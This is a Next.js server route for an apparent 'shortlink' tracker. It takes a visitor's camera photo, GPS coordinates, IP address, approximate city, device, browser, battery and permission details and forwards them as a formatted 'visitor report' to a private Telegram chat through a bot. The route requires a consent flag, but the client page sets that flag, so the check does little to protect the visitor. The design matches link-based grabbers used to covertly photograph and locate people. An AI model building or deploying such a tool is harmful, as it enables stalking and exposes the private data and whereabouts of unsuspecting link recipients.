import { createHmac, timingSafeEqual } from "node:crypto";
import { NextResponse } from "next/server";
import { normalizeCategories, type CookieCategories } from "@/lib/cookie-consent.mjs";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

const TELEGRAM_TIMEOUT_MS = 12_000;
const MAX_IMAGE_BYTES = 5 * 1024 * 1024;
const COOKIE_NAME = "shortlink_consent";
const COOKIE_SECRET = process.env.COOKIE_CONSENT_SECRET || process.env.AUTH_SECRET || process.env.NEXTAUTH_SECRET;

type StoredConsent = { version: 1; updatedAt: string; categories: CookieCategories };

function readCookieConsent(request: Request): StoredConsent | null {
  const rawCookie = request.headers.get("cookie")?.split(";").map((part) => part.trim())
    .find((part) => part.startsWith(`${COOKIE_NAME}=`))?.slice(COOKIE_NAME.length + 1);
  if (!rawCookie || !COOKIE_SECRET) return null;
  const separator = rawCookie.lastIndexOf(".");
  if (separator <= 0) return null;
  const payload = rawCookie.slice(0, separator);
  const signature = rawCookie.slice(separator + 1);
  const expected = createHmac("sha256", COOKIE_SECRET).update(payload).digest("base64url");
  const expectedBytes = Buffer.from(expected);
  const receivedBytes = Buffer.from(signature);
  if (expectedBytes.length !== receivedBytes.length || !timingSafeEqual(expectedBytes, receivedBytes)) return null;
  try {
    const parsed: unknown = JSON.parse(Buffer.from(payload, "base64url").toString("utf8"));
    if (!parsed || typeof parsed !== "object") return null;
    const record = parsed as Partial<StoredConsent>;
    const categories = normalizeCategories(record.categories);
    if (record.version !== 1 || typeof record.updatedAt !== "string" || !Number.isFinite(Date.parse(record.updatedAt)) || !categories) return null;
    return { version: 1, updatedAt: record.updatedAt, categories };
  } catch {
    return null;
  }
}

type Gps = { lat: number; lon: number; accuracy?: number };
type ReportBody = {
  consent?: unknown;
  image?: unknown;
  gps?: unknown;
  device?: unknown;
  battery?: unknown;
  permissions?: unknown;
  session?: unknown;
  connection?: unknown;
};

function asObject(value: unknown): Record<string, unknown> {
  return value && typeof value === "object" && !Array.isArray(value)
    ? value as Record<string, unknown>
    : {};
}

function safeText(value: unknown, max = 180): string {
  if (typeof value !== "string" && typeof value !== "number" && typeof value !== "boolean") {
    return "Unavailable";
  }
  const text = String(value).replace(/[\u0000-\u001f\u007f]/g, " ").trim();
  return text ? text.slice(0, max) : "Unavailable";
}

function parseGps(value: unknown): Gps | null {
  const gps = asObject(value);
  const lat = gps.lat;
  const lon = gps.lon;
  const accuracy = gps.accuracy;
  if (typeof lat !== "number" || !Number.isFinite(lat) || lat < -90 || lat > 90) return null;
  if (typeof lon !== "number" || !Number.isFinite(lon) || lon < -180 || lon > 180) return null;
  return {
    lat,
    lon,
    ...(typeof accuracy === "number" && Number.isFinite(accuracy) && accuracy >= 0
      ? { accuracy: Math.min(accuracy, 1_000_000) }
      : {}),
  };
}

function parseImage(value: unknown): { data: string; mime: string } | null {
  if (typeof value !== "string" || !value) return null;
  const match = value.match(/^data:(image\/(?:jpeg|png|webp));base64,([A-Za-z0-9+/=\r\n]+)$/);
  if (!match) throw new Error("IMAGE_INVALID");
  const data = match[2].replace(/\s/g, "");
  const bytes = Buffer.from(data, "base64");
  if (!data || bytes.length > MAX_IMAGE_BYTES || bytes.length === 0) throw new Error("IMAGE_TOO_LARGE");
  return { data, mime: match[1] };
}

export async function POST(req: Request) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!botToken || !chatId) {
    return NextResponse.json(
      { error: "Telegram belum dikonfigurasi. Atur TELEGRAM_BOT_TOKEN dan TELEGRAM_CHAT_ID." },
      { status: 503 },
    );
  }

  let body: ReportBody;
  try {
    body = await req.json() as ReportBody;
  } catch {
    return NextResponse.json({ error: "Body harus berupa JSON yang valid." }, { status: 400 });
  }

  // Camera/location and visitor details must never be sent without explicit consent.
  if (body.consent !== true) {
    return NextResponse.json(
      { error: "Persetujuan eksplisit diperlukan sebelum laporan dikirim." },
      { status: 403 },
    );
  }

  const device = asObject(body.device);
  const battery = asObject(body.battery);
  const permissions = asObject(body.permissions);
  const session = asObject(body.session);
  const connection = asObject(body.connection);
  const gps = parseGps(body.gps);

  let image: { data: string; mime: string } | null;
  try {
    image = parseImage(body.image);
  } catch (error) {
    const code = error instanceof Error ? error.message : "";
    const message = code === "IMAGE_TOO_LARGE"
      ? "Foto kosong atau melebihi batas 5 MB."
      : "Foto harus berupa data URL JPEG, PNG, atau WebP yang valid.";
    return NextResponse.json({ error: message }, { status: 400 });
  }

  const cookieConsent = readCookieConsent(req);
  const headers = req.headers;
  const forwardedFor = headers.get("x-forwarded-for")?.split(",")[0]?.trim();
  const ip = forwardedFor || headers.get("x-real-ip") || "IP tidak tersedia dari header proxy";
  // Vercel may provide approximate network location in trusted request headers.
  // Do not call a third-party IP lookup service or claim ISP/organization data we do not have.
  const country = headers.get("x-vercel-ip-country");
  const region = headers.get("x-vercel-ip-country-region");
  const city = headers.get("x-vercel-ip-city");
  const locationParts = [city, region, country].filter((part): part is string => Boolean(part?.trim()));
  const networkLocation = locationParts.length ? locationParts.join(", ") : "Lokasi jaringan tidak disediakan header hosting";
  const userAgent = safeText(device.userAgent ?? headers.get("user-agent"), 300);
  const osFallback = /Android/i.test(userAgent) ? "Android"
    : /iPhone|iPad|iPod/i.test(userAgent) ? "iOS"
    : /Windows/i.test(userAgent) ? "Windows"
    : /Mac OS|Macintosh/i.test(userAgent) ? "macOS"
    : /Linux/i.test(userAgent) ? "Linux"
    : "Unavailable";
  const browserFallback = /Edg\//i.test(userAgent) ? "Microsoft Edge"
    : /Firefox\//i.test(userAgent) ? "Firefox"
    : /SamsungBrowser/i.test(userAgent) ? "Samsung Internet"
    : /Chrome\//i.test(userAgent) ? "Chrome"
    : /Safari\//i.test(userAgent) && !/Chrome\//i.test(userAgent) ? "Safari"
    : "Unavailable";
  // Best-effort device inference. Browsers deliberately restrict hardware details.
  const modelMatch = userAgent.match(/;\\s*([^;()]+?)\\s+Build\\//i)
    || userAgent.match(/\\((?:Linux; )?(?:Android [^;]+; )?([^;)]+)\\)/i);
  const modelFallback = modelMatch?.[1]?.trim() || "Model tidak diekspos browser";
  const deviceValue = (value: unknown, fallback: string) => {
    const parsed = safeText(value);
    return parsed === "Unavailable" ? fallback : parsed;
  };
  const lines = [
    "🚀 SHORTLINK VISITOR REPORT",
    "━━━━━━━━━━━━━━━━━━━━",
    "",
    "🌐 NETWORK & GEO-IP",
    `├ IP: ${ip}`,
    "├ ISP: Tidak disediakan header hosting; perlu database Geo-IP",
    "├ ORG: Tidak disediakan header hosting; perlu database Geo-IP",
    `└ Location: ${networkLocation}`,
    "",
    "🎯 GPS",
    gps
      ? `├ Coordinates: ${gps.lat}, ${gps.lon}${gps.accuracy == null ? "" : ` (±${Math.round(gps.accuracy)}m)`}`
      : "├ Coordinates: Not shared",
    ...(gps ? [`└ Maps: https://www.google.com/maps?q=${gps.lat},${gps.lon}`] : ["└ Maps: Not shared"]),
    "",
    "📱 DEVICE / BROWSER",
    `├ Model: ${deviceValue(device.model, modelFallback)}`,
    `├ OS: ${deviceValue(device.os, osFallback === "Unavailable" ? "OS tidak teridentifikasi dari User-Agent" : osFallback)}`,
    `├ Browser: ${deviceValue(device.browser, browserFallback === "Unavailable" ? "Browser tidak teridentifikasi" : browserFallback)}`,
    `├ RAM: ${deviceValue(device.ram, "Tidak diekspos browser; API deviceMemory opsional")}`,
    `├ CPU: ${deviceValue(device.cpu, "Model CPU tidak diekspos; jumlah core perlu dilaporkan klien")}`,
    `├ GPU: ${deviceValue(device.gpu, "Informasi GPU perlu deteksi WebGL di klien")}`,
    `├ Language: ${deviceValue(device.language, "Bahasa tidak dilaporkan klien")}`,
    `├ Timezone: ${deviceValue(device.timezone, "Zona waktu tidak dilaporkan klien")}`,
    `└ Screen: ${deviceValue(device.screen, "Resolusi tidak dilaporkan klien")}`,
    "",
    "🔋 BATTERY",
    `├ Level: ${typeof battery.level === "number" && Number.isFinite(battery.level) ? `${Math.round(battery.level)}%`  : "Browser tidak memberikan data baterai"}`,
    `└ Charging: ${typeof battery.charging === "boolean" ? (battery.charging ? "Yes" : "No") : "API baterai tidak tersedia / tidak diizinkan"}`,
    "",
    "🛡️ PERMISSIONS (client-reported)",
    `├ Location: ${deviceValue(permissions.location, "Status izin tidak dilaporkan klien")}`,
    `└ Camera: ${deviceValue(permissions.camera, "Status izin tidak dilaporkan klien")}`,
    "",
    "🔗 SHORTLINK",
    `├ Name: ${safeText(session.linkName)}`,
    `└ URL: ${safeText(session.url, 300)}`,
    "",
    "🍪 COOKIE CONSENT",
    ...(cookieConsent ? [
      `├ Updated: ${cookieConsent.updatedAt}`,
      `├ Functional: ${cookieConsent.categories.functional ? "accepted" : "rejected"}`,
      `├ Analytics: ${cookieConsent.categories.analytics ? "accepted" : "rejected"}`,
      `└ Marketing: ${cookieConsent.categories.marketing ? "accepted" : "rejected"}`,
    ] : ["└ Preferences: Tidak ada cookie persetujuan valid yang ditandatangani"]),
    "",
    "━━━━━━━━━━━━━━━━━━━━",
    "Sent only after explicit consent.",
  ];
  const caption = lines.join("\n").slice(0, 1024);

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), TELEGRAM_TIMEOUT_MS);
  try {
    const endpoint = `https://api.telegram.org/bot${botToken}/${image ? "sendPhoto" : "sendMessage"}`;
    let telegramResponse: Response;

    if (image) {
      const form = new FormData();
      form.set("chat_id", chatId);
      form.set("caption", caption);
      form.set("photo", new Blob([Buffer.from(image.data, "base64")], { type: image.mime }), "capture");
      telegramResponse = await fetch(endpoint, { method: "POST", body: form, signal: controller.signal });
    } else {
      telegramResponse = await fetch(endpoint, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: lines.join("\n").slice(0, 4096), disable_web_page_preview: true }),
        signal: controller.signal,
      });
    }

    const result = await telegramResponse.json().catch(() => null) as { ok?: boolean; description?: string } | null;
    if (!telegramResponse.ok || result?.ok !== true) {
      console.error("Telegram delivery failed", { status: telegramResponse.status, description: result?.description });
      return NextResponse.json({ error: "Telegram gagal menerima laporan. Periksa token, chat ID, dan akses bot." }, { status: 502 });
    }

    return NextResponse.json({ success: true, telegram: true });
  } catch (error) {
    const timedOut = error instanceof Error && error.name === "AbortError";
    console.error("POST /api/snap Telegram request failed", { timedOut });
    return NextResponse.json(
      { error: timedOut ? "Telegram timeout; coba lagi." : "Tidak dapat menghubungi Telegram." },
      { status: 502 },
    );
  } finally {
    clearTimeout(timeout);
  }
}
